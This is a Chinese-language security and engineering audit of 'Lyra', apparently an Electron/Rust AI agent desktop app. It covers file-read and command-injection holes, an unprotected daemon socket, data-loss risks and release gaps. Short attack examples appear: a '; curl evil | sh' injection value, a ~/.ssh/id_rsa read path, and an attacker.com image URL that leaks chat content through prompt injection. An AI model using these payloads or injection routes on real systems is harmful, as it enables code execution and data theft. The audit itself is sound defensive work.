# Lyra 工程审计报告

审计日期：2026-07-02。方式：只读代码审计（Electron main/preload/renderer、Rust workspace 全量 crates、services、scripts、legal、CI）。定位：按"准备商业发布、长期维护、多人协作、真实用户使用"的标准审查。

标注说明：
- **[已验证]** = 审计中直接读取源码确认。
- **[高置信]** = 深度探查结论，附带代码证据，建议修复前复核一遍现场。

---

## 0. 结论摘要

这个项目的架构分层（TS 薄桥 / Rust 拥有核心逻辑）、Electron 窗口安全基线（contextIsolation/sandbox 全开）、敏感值加密（safeStorage）、边界治理工具链是认真做过的。但以商业发布标准衡量，当前有 **4 类会直接阻断发布的问题**：

1. **两个已确认的任意文件读取 / 命令注入漏洞**（§1.1、§1.2）。
2. **lyrad daemon 本地攻击面完全未设防**：socket 无权限、无对端认证、无实例锁（§1.3）。
3. **发布链路不存在**：无 mac/win 打包脚本、无签名/公证、无自动更新、版本号全是 0.0.0（§4）。
4. **数据层在崩溃/升级/降级场景下会真实丢数据**：非原子写、schema 升级直接清空会话、删除会话不清理记忆（§3）。

其余为高价值的稳定性/性能/测试/维护性问题，按优先级列于后。

---

## 1. 安全（发布阻断级）

### 1.1 `lyra-file://` 协议：任意文件读取 —— **Critical [已验证]**

[apps/desktop/src/main/index.ts](apps/desktop/src/main/index.ts#L587) `resolveLyraFilePath` 直接返回 URL query 中的 `path` 参数，`registerLyraFileProtocol`（约 L640）随后无条件 `readFile(filePath)`。没有任何白名单目录、`..` 检查、realpath 校验。

- 攻击链：任何能在 renderer 触发资源加载的内容（LLM 生成的 markdown/HTML、浏览器自动化页面注入的内容）都可以构造 `lyra-file:///?path=/Users/x/.ssh/id_rsa`。CSP 中 `img-src` 和 `connect-src` 明确放行了 `lyra-file:`（[apps/desktop/src/renderer/index.html](apps/desktop/src/renderer/index.html#L7)），这个协议对整个 renderer 可达。
- 该协议本意是预览图片，修复面很窄：限制到明确的允许根目录集合（workspace + 临时截图目录），normalize + realpath 前缀校验，拒绝其余一切。

### 1.2 `openInEditor`：shell 命令注入 —— **Critical [已验证]**

[apps/desktop/src/main/index.ts](apps/desktop/src/main/index.ts#L1365)：

```ts
exec(`open -a "${ed.bundle.replace(/\.app$/u, "")}" "${request.path}"`);
exec(`${ed.cmd} "${request.path}"`);
```

`request.path` 来自 renderer IPC，只做了 `typeof === "string"` 检查。path 含 `"; curl evil | sh; "` 即任意命令执行。renderer 被 XSS/注入攻陷后这是从沙箱到主机 RCE 的直通道。修复是一行量级：改 `execFile("open", ["-a", bundle, path])`。

同一批 handler 中还有两个次级问题 **[已验证]**：
- `openExternal`（L1293）对 URL 无协议白名单，`file://`、`javascript:` 等均可透传给 `shell.openExternal`。
- `revealInFolder`（L1386）对 path 只查非空即交给 `shell.openPath`——`openPath` 会**执行/打开**任意文件，不只是揭示目录。

### 1.3 lyrad daemon：本地攻击面未设防 —— **Critical [已验证]**

[crates/lyrad/src/main.rs](crates/lyrad/src/main.rs#L240-L280)：

1. `UnixListener::bind` 后**没有** `set_permissions(0o700)`，socket 权限由 umask 决定；也没有 `getpeereid`/`SO_PEERCRED` 对端校验。socket 位于 `~/.lyra/.../runtime/lyrad.sock`（[apps/desktop/src/main/runtime-client.ts](apps/desktop/src/main/runtime-client.ts#L73)）。在多用户机器上，其他本地用户可直接连上并调用全部方法：`agent.run`、终端创建、文件工具、下载。daemon 的方法面就是"以当前用户身份执行任意操作"的 RPC。
2. **无实例锁**：启动时 `if socket_path.exists() { remove_file() }`——第二个实例会直接删掉第一个实例正在服务的 socket 并顶替，两个 daemon 同时活着写同一批 `~/.lyra` 数据（与 §3.2 并发写问题复合）。
3. `listener.accept()` 出错走 `std::process::exit(1)`，不清理子进程（终端 shell、LSP server、下载任务全部变孤儿，见 §2.4）。

Windows named pipe 一侧同样没有 SecurityDescriptor **[高置信]**。

### 1.4 lyra-runtime socket 消息无大小上限 —— **High [高置信]**

daemon 按行读 JSON，无 max frame size。恶意/异常客户端发送超大行可把 daemon 打到 OOM。与 1.3 复合（无认证）时任何本地进程可打挂 daemon。

### 1.5 uiux-packs：npm install / git clone 执行第三方代码 —— **High [高置信]**

[apps/desktop/src/main/uiux-packs/service.ts](apps/desktop/src/main/uiux-packs/service.ts#L147)：从 renderer 传入的包名/git URL 直接 `npm install` / `git clone`，未加 `--ignore-scripts`，postinstall 即任意代码执行；git URL 无协议校验。安装第三方 pack 本身可以是产品功能，但至少要 `--ignore-scripts` + 协议白名单 + 明确的用户风险提示。

### 1.6 下载路径未做规范化前缀校验 —— **High [高置信]**

[crates/lyra-download-core/src/manager.rs](crates/lyra-download-core/src/manager.rs#L147)：`partial_file_path` 可控且直接使用，`sanitize_file_name` 只处理文件名不处理路径段。agent（受 prompt injection 影响的 LLM）可指定下载目标为工作区外任意路径，等于任意文件写。需要 canonicalize + 允许目录前缀校验。

### 1.7 API key 明文落盘 + 权限审批"仅记录" —— **High [高置信]**

- Electron 侧敏感值走 `safeStorage` 加密（[apps/desktop/src/main/sensitive-values/service.ts](apps/desktop/src/main/sensitive-values/service.ts)）——这部分是对的。但 Rust runtime 侧 provider key 会进入 `~/.lyra/modules/agent-runtime/state.json` **未加密**（[crates/lyra-agent-runtime/src/native_backend/state.rs](crates/lyra-agent-runtime/src/native_backend/state.rs#L396)）。两套存储、一套加密一套明文，等于没加密。
- 权限系统（[crates/lyra-agent-runtime/src/native_backend/permissions.rs](crates/lyra-agent-runtime/src/native_backend/permissions.rs)）的决策在 Rust 后端强制、TS 无法绕过——设计正确。但"一次性批准"没有一次性令牌语义：批准后同工具重复调用不再询问 **[高置信]**，用户意图与实际授权范围不一致，这在 agent 产品里是真实的信任事故来源。

### 1.8 Prompt-injection 数据外带通道 —— **Medium**

markdown 渲染允许 `img-src https: http:`（CSP，[index.html](apps/desktop/src/renderer/index.html#L7)）。LLM 输出 `![](https://attacker.com/?q=<对话内容>)` 即可静默外带会话数据。商业 AI 桌面产品通常对 LLM 渲染内容的远程图片做代理或确认。另外 [packages/markdown-render/src/index.ts](packages/markdown-render/src/index.ts#L122) 的 DOMPurify 配置开了 `ALLOW_DATA_ATTR: true` 且 ADD_TAGS 偏宽，建议收紧（LLM 输出直达 6 处 `dangerouslySetInnerHTML`）。

---

## 2. 稳定性（用户会真实踩到）

### 2.1 终端 PTY 输出缓冲无界 —— **Critical [高置信]**

[crates/lyra-terminal-core/src/live_output.rs](crates/lyra-terminal-core/src/live_output.rs#L18)：`SessionOutputState` 的 `buffer`/`text_buffer` 两个 Vec 无限 append，`MAX_SESSION_BUFFER_BYTES` 常量定义了但**没有任何强制点**。用户跑一次 `yes`、一次大型编译日志，桌面进程内存直线上升直到 OOM。这是终端类产品的第一课（ring buffer），也是用户最容易踩到的崩溃路径。

配套问题：全局 `SESSIONS` HashMap 无驱逐（[session_runtime.rs](crates/lyra-terminal-core/src/session_runtime.rs#L32)），会话只增不减；子进程 kill 在后台线程发出后不确认（L257），快速开关会话累积僵尸进程。

### 2.2 取消不传播到 LLM 请求 —— **High [高置信]**

[crates/lyra-agent-runtime/src/native_backend/turns.rs](crates/lyra-agent-runtime/src/native_backend/turns.rs#L190)：取消检查发生在 `model_result` 完成**之后**，无 HTTP abort。用户点"停止"后 UI 显示已取消，但流式请求继续跑完（浪费 token 费用 + 后台线程占用）。流式 idle 超时是"每次读重置 180s"（[network.rs](crates/lyra-agent-runtime/src/native_backend/network.rs#L28)），无总时长上限，慢速滴流的 provider 可让一个 turn 永远不结束。

### 2.3 LSP 子进程管理 —— **High [高置信]**

[crates/lyra-lsp-core/src/lib.rs](crates/lyra-lsp-core/src/lib.rs#L467)：stderr 读线程逐行 emit 无背压；`child.wait()` 无超时、无强制 kill 升级路径。rust-analyzer 卡死或 stderr 刷屏时：进程泄漏 + 事件队列膨胀。长期运行的桌面 app 里 LSP 崩溃是常态事件，必须有 kill 超时和重启退避。

### 2.4 孤儿进程无清理协议 —— **High [已验证部分]**

daemon 异常退出（§1.3 第 3 点）或被 SIGKILL 后，终端 shell、LSP server、aria2 下载进程无人回收；Electron 重启后新 daemon 也不认领旧进程。需要 process-group/job-object 级别的生命周期绑定（Linux: prctl PDEATHSIG / macOS: kqueue 监视 / Windows: Job Object），这是跨平台桌面 daemon 的标配。

### 2.5 Mutex poisoning 级联 —— **Medium [高置信]**

runtime 广泛使用 `lock().expect(...)`。任意一个请求处理线程 panic 后锁中毒，后续所有请求跟着 panic，单个坏请求放大为整个 daemon 不可用。要么用 `parking_lot`（无毒化），要么统一处理 `PoisonError`。

### 2.6 NAPI 同步阻塞 event loop —— **Medium [高置信]**

[crates/lyra-files-napi/src/lib.rs](crates/lyra-files-napi/src/lib.rs) 的 `read_directory`、`safely_eject_device` 等是同步 `#[napi]`，重 IO 直接阻塞 Electron main 进程 event loop。在 50 万文件的目录上调 `read_directory` = 主进程冻结数秒 = 全部窗口无响应。需要 AsyncTask 化。

---

## 3. 数据安全 / 数据丢失

### 3.1 非原子写入 —— **High [高置信]**

- Rust：[state.rs `write_json`](crates/lyra-agent-runtime/src/native_backend/state.rs#L377) 用 `fs::write` 直接覆盖 `state.json`。崩溃/断电 = 文件截断，读取侧 `unwrap_or_default()` **静默重置为空**——用户丢失激活会话、provider 配置，且无任何提示。
- TS：[login-manager/store.ts](apps/desktop/src/main/login-manager/store.ts#L59)、workbench-state 同样直接 `writeFileSync` 覆盖，解析失败静默返回空 store。

修复统一为 write-temp + fsync + rename，读取失败至少要留 `.corrupt` 备份 + 日志。codegraph 的 RocksDB 已经有 corrupt 隔离逻辑（[codegraph-server/src/mcp/server.rs](crates/codegraph-server/src/mcp/server.rs#L548)），照着抄即可。

### 3.2 多进程并发写 `~/.lyra` 无任何锁 —— **High**

与 §1.3 无实例锁复合：两个 Electron 实例 / Electron+CLI / 双 daemon 都可能同时写 login-manager JSON、session SQLite（未设 `PRAGMA busy_timeout`，锁冲突直接报错）。后写覆盖先写，用户数据静默丢失。

### 3.3 Schema"迁移"= 清空数据 —— **High [高置信]**

[state.rs](crates/lyra-agent-runtime/src/native_backend/state.rs#L29)：`previous_tool_runtime_schema_version < TOOL_RUNTIME_SCHEMA_VERSION` 时直接 `clear_session_files`。含义：**每次 schema 升级，用户全部历史会话被删除**。对开发期可接受，对商业产品这是"升级即删库"。降级（用户回滚旧版本）则是读新 schema 崩溃，无兼容模式。发布前必须有真实迁移路径 + 升级前快照。

### 3.4 删除会话 ≠ 删除数据（隐私）—— **Medium [高置信]**

[sessions.rs `delete_session`](crates/lyra-agent-runtime/src/native_backend/sessions.rs#L561) 只删 session 目录；`agent-memory/store.sqlite` 中该会话的 facts 不级联删除，之后还会被记忆检索召回。用户"删除对话"的预期与现实不符，GDPR 式删除请求也无法满足。

### 3.5 无界增长 —— **Medium**

session_dialog 表、terminal JSONL、agent memory facts 均无上限/轮转/过期。长期用户的 `~/.lyra` 会涨到 GB 级且无任何 UI 可见性或清理入口。

---

## 4. 发布链路（当前不具备发布能力）—— **Critical [已验证/确认缺失]**

| 项 | 状态 |
|---|---|
| macOS/Windows 打包脚本 | **缺失**（仅有 `dist:linux`，[apps/desktop/package.json](apps/desktop/package.json)） |
| 代码签名 / notarize | **缺失**（无 afterSign/notarize/证书配置）。未签名 = macOS Gatekeeper 拦截、Windows SmartScreen 警告 |
| 自动更新 | **缺失**（全仓库无 autoUpdater/electron-updater）。无法推送安全补丁——结合 §1 的漏洞，这本身就是安全问题 |
| 版本管理 | workspace 全部 `0.0.0`，无版本升级流程、无 CHANGELOG 校验 |
| 包管理器混用 | 根用 pnpm，apps/desktop 存在独立 `package-lock.json` 用 npm——两套解析结果可能不一致，CI 语义不明确 |
| 仓库卫生 | `apps/desktop/.tmp/`、`.tmp-win-node-import/`、`lumen-evidence/`、`screenshot*.png` 未进 .gitignore |

做得对的部分：native 二进制 staging（[scripts/desktop/stage-native-resources.ts](scripts/desktop/stage-native-resources.ts)）有多平台支持；aria2/rust-analyzer 捆绑有 SHA256 校验；`release:preflight` 存在（typecheck + test + 二进制校验）；第三方 notices 生成覆盖 npm + cargo，未发现 GPL/AGPL 混入。

---

## 5. 性能

1. **聊天无虚拟化 + 每 token 全量 markdown 重渲染** —— High。[ChatView.tsx](apps/desktop/src/modules/workbench/ai-panel/lyra-agents/features/chat/ChatView.tsx) 全量渲染所有消息；[LyraDocument.tsx](apps/desktop/src/modules/workbench/ai-panel/lyra-agents/features/rich-text/LyraDocument.tsx#L245) 每次 content 变化（每 token）重跑 `renderMarkdown`；Message memo 比较函数 250+ 行逐块扫描。长会话（数百条消息 + 流式）会明显卡顿。需要：窗口化/虚拟化 + 流式节流批处理 + 已完成块的渲染缓存。
2. **codegraph 40+ tree-sitter grammar 全量静态链接** —— High。[codegraph-server/src/parser_registry.rs](crates/codegraph-server/src/parser_registry.rs) 无条件初始化 40 个 parser，全部 grammar 编译进二进制，估算给分发体积贡献 100MB+ 量级，且索引无取消/进度机制、RocksDB 无 cache 上限。绝大多数用户只用 2-3 门语言——按 feature 拆分或懒加载。
3. **图片解码 128MB/chunk 无并发上限**（[lyra-image-core/src/lib.rs](crates/lyra-image-core/src/lib.rs#L24)）—— Medium，多个大 TIFF 并发即数百 MB 峰值。

---

## 6. 测试缺口（对应高风险路径）

现状：Rust 约 1000 个测试（集中在 lyra-agent-runtime），TS 约 140 个 vitest 文件，CI 有 3 条 workflow（agent 回归 / 终端 gate / 结构守卫）。缺口按风险排序：

1. **daemon 生命周期零集成测试**：握手失败、断线重连、daemon 崩溃恢复、双实例竞争——全部无覆盖。这正是 §1.3/§2.4 问题所在的路径。
2. **Windows 路径处理无测试**：[lyra-files-core/src/paths.rs](crates/lyra-files-core/src/paths.rs) 有 Windows 条件编译逻辑（盘符、大小写、UNC）但零测试，而 CI 也看不到 Windows runner。Windows 用户的文件工具/权限判定属于"发布后才发现"的高危区。
3. **lyra-tool-fs-core 零单元测试**，仅 3 个 snapshot——工具发现/排序回归会被"更新快照"动作掩盖。仓库整体 snapshot 测试占比偏高，同样的掩盖风险存在于 prompt 快照、reader HTML 快照。
4. **E2E 完全缺失**：无 Playwright/Electron 级测试，IPC 超时、preload 通道断裂类问题只能在生产复现。
5. 权限流程只测了 allow/deny，无超时（用户不响应弹窗时 agent 是否卡死）分支。

安全修复（§1）落地时应同步补：lyra-file 路径逃逸测试、openInEditor 注入测试、socket 权限测试——否则回归。

---

## 7. 架构与维护性

1. **`Codex开源协议声明.txt` / `Cursor开源协议声明.txt` 需要法务定性** —— High。根目录存在这两份声明且 [legal/manual-third-party.json](legal/manual-third-party.json) 手动声明了 "OpenAI Codex (Apache-2.0)"。如果代码基有从 Codex/Cursor 移植的部分，Apache-2.0 的 NOTICE/attribution 义务要在**分发产物**里兑现（当前 THIRD_PARTY_NOTICES 进入了 extraResources，方向对，但需核对移植范围与声明一致）。商业发布前这必须有明确结论，不能停在两个 txt。
2. **死代码/空壳误导协作者** —— Medium [高置信]：`lyra-local-inference-core` 全仓库零调用方；`services/control-plane`、`services/browser-automation` 是 `echo scaffold ready` 空壳；`web/site` 目录为空但根 package.json 留着 `dev:site` 脚本。要么接线、要么归档，否则每个新协作者都要花时间搞清"这些是不是真的"。
3. **TS/Rust 双份手写 schema** —— Medium：会话/记忆等类型在 [apps/desktop/src/shared/agent.ts](apps/desktop/src/shared/agent.ts) 与 [crates/lyra-agent-api/src/lib.rs](crates/lyra-agent-api/src/lib.rs) 各写一份，靠人肉同步。协议已有 `PROTOCOL_VERSION=1` 且精确匹配无降级——每次协议演进都是全量 lockstep 升级。字段漂移是这种结构的必然结局，建议单一 schema 源 + 代码生成。
4. **自定义边界 lint 多为正则匹配** —— Low-Medium：7 个 verify-* 脚本中 5 个是行级正则，动态 import/别名即可绕过，且无 ESLint/clippy 等标准 lint 配置兜底。tsconfig strict 全开是对的；建议把正则检查逐步迁到 TS Program API / ESLint rule，并给 Rust 加 clippy CI。
5. **产品范围 vs 团队规模** —— 商业判断项：仓库同时承载 agent 桌面端、浏览器自动化、computer-use、40+ 语言 codegraph、本地推理（未接线）、下载管理器、文件管理器、终端、LSP、图片处理、docs 站、营销站（空）、control-plane（空）。粗估 Rust+TS 主体代码 5 万行以上。其中 codegraph 40+ 语言与 local-inference 的维护成本和当前集成深度明显不成比例。发布策略上建议明确 v1 核心面（agent + 终端 + 文件 + 浏览器），其余降级为 feature-flag 或延后，否则每个面都会摊薄修复 §1-§4 的资源。

---

## 8. UI/UX（影响商业观感的实质问题）

1. **无全局 ErrorBoundary + 37 处 `.catch(() => undefined)`** —— High [高置信]。渲染层任何异常直接白屏；打开文件失败、清除站点数据失败等操作静默无反馈。商业桌面软件的最低要求是失败可见。
2. **键盘可达性系统性缺失** —— Medium：多处 `role="button"` 的 span/div 无 `onKeyDown`（复制、引用 chip 等），键盘/读屏用户不可用。若目标市场含政企采购，可访问性是硬门槛。
3. **i18n 无 key 一致性校验** —— Low：zh-CN/en-US 两份 locale 手动维护（zh-CN 文件里有"merged from…"注释），新 key 漏翻会直接把 key 名渲染给用户。CI 加一个 key 集合相等断言即可。

---

## 9. 修复优先级建议

**P0（任何形式的发布/外部测试前）**
1. §1.1 lyra-file 路径白名单；§1.2 exec→execFile；§1.3 socket chmod 0700 + peer-cred 校验 + 实例锁。三者都是小 diff。
2. §3.1 原子写（write-temp-rename），§3.3 停止"升级即清空"，至少升级前把 sessions 目录整体快照一份。
3. §2.1 终端 ring buffer 强制上限（常量已存在，补强制点）。

**P1（v1 发布门槛）**
4. §4 全部：mac/win 打包 + 签名公证 + electron-updater + 版本流程。
5. §2.2 取消传播 + 请求总超时；§2.3 LSP kill 超时；§2.4 子进程生命周期绑定。
6. §1.6 下载路径校验；§1.5 npm --ignore-scripts；§1.7 Rust 侧 key 加密统一。
7. §6.1/6.2 daemon 生命周期集成测试 + Windows 路径测试（配 Windows CI runner）。

**P2（v1.x）**
8. §5.1 聊天虚拟化与流式批处理；§5.2 codegraph 按需加载。
9. §3.4 级联删除 + 数据保留策略；§8.1 ErrorBoundary + 错误呈现。
10. §7.2 归档死代码；§7.3 schema 单源化。

---

## 10. 明确做对了的（避免重复投入）

- 所有 BrowserWindow/WebContentsView：`contextIsolation: true`、`sandbox: true`、`nodeIntegration: false`，preload 只暴露强类型 API 不透传 ipcRenderer，`setWindowOpenHandler` 全覆盖。**[已验证]**
- 权限决策在 Rust 后端强制，TS 侧不可绕过；MCP server 需显式注册。
- 敏感值 Electron 侧走 safeStorage；git 工具的相对路径校验正确阻止 `..` 与绝对路径。
- browser 自动化注入脚本用 `JSON.stringify` 序列化参数，模板不受 LLM 控制。
- tsconfig strict 全家桶开启；aria2/rust-analyzer 捆绑有 SHA256 校验；第三方 notices 自动生成覆盖 npm+cargo。

以上区域不需要重做，需要的是把同等纪律延伸到 §1 列出的少数遗漏点上。
